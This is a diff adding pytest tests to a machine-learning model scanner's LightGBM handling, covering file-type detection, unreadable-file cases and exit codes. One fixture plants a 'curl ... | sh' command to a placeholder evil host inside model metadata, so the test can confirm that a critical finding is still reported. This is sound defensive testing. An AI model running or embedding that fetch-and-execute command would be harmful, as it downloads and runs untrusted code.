@@ -4,6 +4,10 @@ from __future__ import annotations
 
 from pathlib import Path
 
+import pytest
+
+from modelaudit.core import determine_exit_code, scan_model_directory_or_file
+from modelaudit.models import ModelAuditResultModel
 from modelaudit.scanners import get_scanner_for_file
 from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, Check, CheckStatus, IssueSeverity, ScanResult
 from modelaudit.scanners.lightgbm_scanner import LightGBMScanner
@@ -39,6 +43,33 @@ def _check_by_name(result: ScanResult, name: str) -> list[Check]:
     return [check for check in result.checks if check.name == name]
 
 
+def _scan_without_cache(path: Path) -> ModelAuditResultModel:
+    return scan_model_directory_or_file(str(path), cache_scan_results=False)
+
+
+def _assert_lightgbm_read_failure(
+    direct: ScanResult,
+    aggregate: ModelAuditResultModel,
+    path: Path,
+) -> None:
+    read_checks = _check_by_name(direct, "LightGBM File Read")
+    assert len(read_checks) == 1
+    assert read_checks[0].severity == IssueSeverity.INFO
+    assert read_checks[0].details["analysis_incomplete"] is True
+    assert read_checks[0].details["scan_outcome_reason"] == "lightgbm_read_failed"
+    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+    assert "lightgbm_read_failed" in direct.metadata["scan_outcome_reasons"]
+    assert direct.metadata["operational_error"] is True
+    assert direct.metadata["operational_error_reason"] == "lightgbm_read_failed"
+
+    metadata = aggregate.file_metadata[str(path)]
+    assert "lightgbm_read_failed" in metadata["scan_outcome_reasons"]
+    assert not [
+        issue for issue in aggregate.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+    ]
+    assert determine_exit_code(aggregate) == 2
+
+
 def test_can_handle_lightgbm_text_model(tmp_path: Path) -> None:
     path = tmp_path / "native.model"
     path.write_text(_build_lightgbm_text(), encoding="utf-8")
@@ -54,11 +85,51 @@ def test_can_handle_lightgbm_binary_like_model(tmp_path: Path) -> None:
     assert LightGBMScanner.can_handle(str(path))
 
 
+def test_can_handle_lightgbm_model_with_misleading_suffix(tmp_path: Path) -> None:
+    path = tmp_path / "renamed.jpg"
+    path.write_text(_build_lightgbm_text(), encoding="utf-8")
+
+    assert LightGBMScanner.can_handle(str(path))
+
+
+def test_can_handle_rejects_renamed_lightgbm_near_match(tmp_path: Path) -> None:
+    path = tmp_path / "near_match.jpg"
+    path.write_text("tree=0\nversion=v4\nnum_class=1\n", encoding="utf-8")
+
+    assert not LightGBMScanner.can_handle(str(path))
+
+
 def test_can_handle_rejects_xgboost_like_model_content(tmp_path: Path) -> None:
     path = tmp_path / "xgb.model"
     path.write_text('{"learner":{"gradient_booster":{"name":"gbtree","tree_param":{}}}}', encoding="utf-8")
 
     assert not LightGBMScanner.can_handle(str(path))
+
+
+@pytest.mark.parametrize(
+    ("suffix", "expected"),
+    [
+        (".lgb", True),
+        (".lightgbm", True),
+        (".model", False),
+        (".txt", False),
+    ],
+)
+def test_can_handle_only_claims_unreadable_dedicated_lightgbm_extensions(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    suffix: str,
+    expected: bool,
+) -> None:
+    path = tmp_path / f"unreadable{suffix}"
+    path.write_text(_build_lightgbm_text(), encoding="utf-8")
+
+    def raise_os_error(*_args: object, **_kwargs: object) -> None:
+        raise OSError("simulated LightGBM signature read failure")
+
+    monkeypatch.setattr("modelaudit.scanners.lightgbm_scanner.open", raise_os_error, raising=False)
+
+    assert LightGBMScanner.can_handle(str(path)) is expected
 
 
 def test_scan_benign_lightgbm_model_avoids_critical_false_positives(tmp_path: Path) -> None:
@@ -122,6 +193,78 @@ def test_scan_bounded_lightgbm_window_is_inconclusive(tmp_path: Path) -> None:
     assert result.success is False
     assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
     assert "lightgbm_bounded_read_incomplete" in result.metadata["scan_outcome_reasons"]
+
+
+def test_lightgbm_read_failure_is_inconclusive_not_security_finding(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    path = tmp_path / "unreadable.lightgbm"
+    path.write_text(_build_lightgbm_text(), encoding="utf-8")
+
+    def raise_os_error(*_args: object, **_kwargs: object) -> None:
+        raise OSError("simulated LightGBM read failure")
+
+    monkeypatch.setattr("modelaudit.core.detect_file_format", raise_os_error)
+    monkeypatch.setattr("modelaudit.core.validate_file_type_with_formats", raise_os_error)
+    monkeypatch.setattr("modelaudit.scanners.zipfile.is_zipfile", raise_os_error)
+    monkeypatch.setattr("modelaudit.scanners.lightgbm_scanner.open", raise_os_error, raising=False)
+
+    direct = LightGBMScanner().scan(str(path))
+    aggregate = _scan_without_cache(path)
+
+    _assert_lightgbm_read_failure(direct, aggregate, path)
+
+
+def test_lightgbm_unreadable_path_preflight_is_inconclusive_not_security_finding(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    path = tmp_path / "permission-denied.lightgbm"
+    path.write_text(_build_lightgbm_text(), encoding="utf-8")
+
+    def deny_access(_path: str, _mode: int) -> bool:
+        return False
+
+    def raise_os_error(*_args: object, **_kwargs: object) -> None:
+        raise OSError("simulated permission-denied read failure")
+
+    monkeypatch.setattr("modelaudit.scanners.base.os.access", deny_access)
+    monkeypatch.setattr("modelaudit.core.detect_file_format", raise_os_error)
+    monkeypatch.setattr("modelaudit.core.validate_file_type_with_formats", raise_os_error)
+    monkeypatch.setattr("modelaudit.scanners.zipfile.is_zipfile", raise_os_error)
+    monkeypatch.setattr("modelaudit.scanners.lightgbm_scanner.open", raise_os_error, raising=False)
+
+    direct = LightGBMScanner().scan(str(path))
+    aggregate = _scan_without_cache(path)
+
+    _assert_lightgbm_read_failure(direct, aggregate, path)
+
+
+def test_lightgbm_read_failure_takes_operational_precedence_over_security_finding(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    unreadable = tmp_path / "unreadable.lightgbm"
+    unreadable.write_text(_build_lightgbm_text(), encoding="utf-8")
+    malicious = tmp_path / "malicious.lightgbm"
+    malicious.write_text(
+        _build_lightgbm_text(["metadata=os.system('curl https://collector.evil.example/payload.sh | sh')"]),
+        encoding="utf-8",
+    )
+
+    def deny_only_unreadable(path: str, _mode: int) -> bool:
+        return path != str(unreadable)
+
+    monkeypatch.setattr("modelaudit.scanners.base.os.access", deny_only_unreadable)
+
+    aggregate = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+
+    metadata = aggregate.file_metadata[str(unreadable)]
+    assert metadata["operational_error_reason"] == "lightgbm_read_failed"
+    assert any(issue.severity == IssueSeverity.CRITICAL for issue in aggregate.issues)
+    assert aggregate.has_errors is True
+    assert determine_exit_code(aggregate) == 2
 
 
 def test_scan_redacts_urls_in_lightgbm_findings(tmp_path: Path) -> None:
